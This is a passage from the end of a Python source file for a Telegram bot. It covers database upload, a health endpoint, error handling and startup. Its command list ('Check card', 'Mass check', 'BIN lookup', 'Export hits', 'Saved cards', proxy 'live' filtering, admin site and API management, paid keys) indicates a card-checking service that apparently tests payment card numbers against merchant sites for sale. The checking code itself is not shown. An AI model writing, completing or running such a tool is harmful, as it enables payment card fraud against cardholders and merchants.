            f"{pe('add')} {sc('Parsed')}: <b>{len(parsed)}</b>\n"
            f"{pe('check')} {sc('Live kept')}: <b>{added}</b></blockquote>",
            parse_mode="HTML", reply_markup=proxy_kb(uid))
    except Exception as e:
        await st.edit_text(f"{pe('cross1')} <b>{sc('Error')}:</b> {esc(str(e))}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════════════════
# DB UPLOAD
# ══════════════════════════════════════════════════════════════════════════════
@router.message(F.document)
async def handle_db_upload(msg: Message):
    uid = msg.from_user.id
    if not is_owner(uid): return
    awaiting = get_awaiting(uid)
    if awaiting != "upload_db": return
    doc = msg.document
    if not (doc.file_name or "").lower().endswith(".db"):
        return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid file')}.</b> {sc('Send a valid .db')}",
                                parse_mode="HTML")
    set_awaiting(uid, '')
    status = await msg.answer(f"{pe('loading')} <b>{sc('Downloading new DB')}...</b>", parse_mode="HTML")
    try:
        file = await msg.bot.get_file(doc.file_id)
        new_db_path = os.path.join(DATA_DIR, "bot_new.db")
        await msg.bot.download_file(file.file_path, new_db_path)
        try:
            test_conn = sqlite3.connect(new_db_path)
            test_conn.execute("SELECT 1 FROM users LIMIT 1")
            test_conn.close()
        except Exception:
            os.remove(new_db_path)
            return await status.edit_text(
                f"{pe('cross1')} <b>{sc('Invalid database file')}.</b>", parse_mode="HTML")
        if os.path.exists(DB_PATH):
            os.rename(DB_PATH, os.path.join(DATA_DIR, "bot_backup.db"))
        os.rename(new_db_path, DB_PATH)
        conn = sqlite3.connect(DB_PATH)
        conn.execute("UPDATE users SET daily_checks = 0")
        conn.commit(); conn.close()
        await status.edit_text(
            f"{pe('check')} <b>{sc('Database Replaced')}!</b>\n"
            f"<blockquote>{sc('Old DB saved as')} <code>bot_backup.db</code>\n"
            f"{pe('refresh')} <b>{sc('Restarting in 3s')}...</b></blockquote>", parse_mode="HTML")
        await asyncio.sleep(3)
        sys.exit(0)
    except Exception as e:
        await status.edit_text(f"{pe('cross1')} <b>{sc('Error')}:</b> {esc(str(e))}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════════════════════
# HEALTH SERVER (for Render web service)
# ══════════════════════════════════════════════════════════════════════════════
async def _health_server():
    port = int(os.environ.get("PORT", 10000))
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="ok"))
    app.router.add_get("/health", lambda r: web.Response(text="ok"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"health server on :{port}")

# ══════════════════════════════════════════════════════════════════════════════
# ERROR HANDLER
# ══════════════════════════════════════════════════════════════════════════════
async def error_handler(event, exception=None, **kwargs):
    if exception is None: exception = kwargs.get("error", Exception("unknown"))
    err_name = type(exception).__name__
    err_msg = str(exception).lower()
    if any(x in err_name for x in ("Disconnect", "Timeout", "ConnectionError", "ClientOSError")):
        return True
    if ("not modified" in err_msg or "query is too old" in err_msg or
        "query id is invalid" in err_msg or "message to edit not found" in err_msg or
        "message can't be edited" in err_msg or "no text in the message" in err_msg or
        "chat not found" in err_msg or "bot was blocked" in err_msg or
        "user is deactivated" in err_msg or "too many requests" in err_msg):
        return True
    log.exception(f"Unhandled {err_name}: {exception}")
    try:
        if isinstance(event, CallbackQuery):
            try: await event.answer("⚠️ Try again")
            except Exception: pass
        elif isinstance(event, Message):
            try:
                await event.answer(f"{pe('cross1')} <b>{sc('Error')}</b>\n"
                                   f"<blockquote><code>{esc(str(exception)[:120])}</code></blockquote>",
                                   parse_mode="HTML")
            except Exception: pass
    except Exception: pass
    return True

# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════
async def main():
    global _db_write_lock
    _db_write_lock = _get_write_lock()
    init_db()
    load_endpoints(force=True)
    load_keys(force=True)

    asyncio.create_task(_health_server())

    if TELEGRAM_PROXY:
        session = AiohttpSession(proxy=TELEGRAM_PROXY)
        bot = Bot(token=BOT_TOKEN, session=session,
                  default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    else:
        bot = Bot(token=BOT_TOKEN,
                  default=DefaultBotProperties(parse_mode=ParseMode.HTML))

    dp = Dispatcher()
    dp.update.outer_middleware(EnsureUserMiddleware())
    dp.include_router(router)
    dp.errors.register(error_handler)
    await bot.delete_webhook(drop_pending_updates=True)

    try:
        await bot.set_my_commands([
            BotCommand(command="start",   description="Menu"),
            BotCommand(command="check",   description="Check card"),
            BotCommand(command="msh",     description="Mass check"),
            BotCommand(command="bin",     description="BIN lookup"),
            BotCommand(command="redeem",  description="Redeem code"),
            BotCommand(command="history", description="History"),
            BotCommand(command="saved",   description="Saved cards"),
            BotCommand(command="stats",   description="Your stats"),
            BotCommand(command="top",     description="Leaderboard"),
            BotCommand(command="streak",  description="Daily streak"),
            BotCommand(command="health",  description="Admin: site health"),
            BotCommand(command="export",  description="Export hits"),
            BotCommand(command="cancel",  description="Cancel mass"),
            BotCommand(command="shop",    description="Premium shop"),
            BotCommand(command="sites",   description="Admin: sites"),
            BotCommand(command="admin",   description="Admin panel"),
            BotCommand(command="apis",    description="Admin: API endpoints"),
            BotCommand(command="addapi",  description="Admin: add API"),
            BotCommand(command="rmapi",   description="Admin: remove API"),
            BotCommand(command="addsite", description="Admin: test & add site"),
            BotCommand(command="genkey",  description="Admin: generate keys"),
        ])
    except Exception: pass

    log.info(f"Bot ready · owner={PRIMARY_ADMIN_ID} · "
             f"{len(get_sites())} sites · {len(load_endpoints()['endpoints'])} APIs")
    asyncio.create_task(site_health_loop(bot))
    await bot.get_me()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())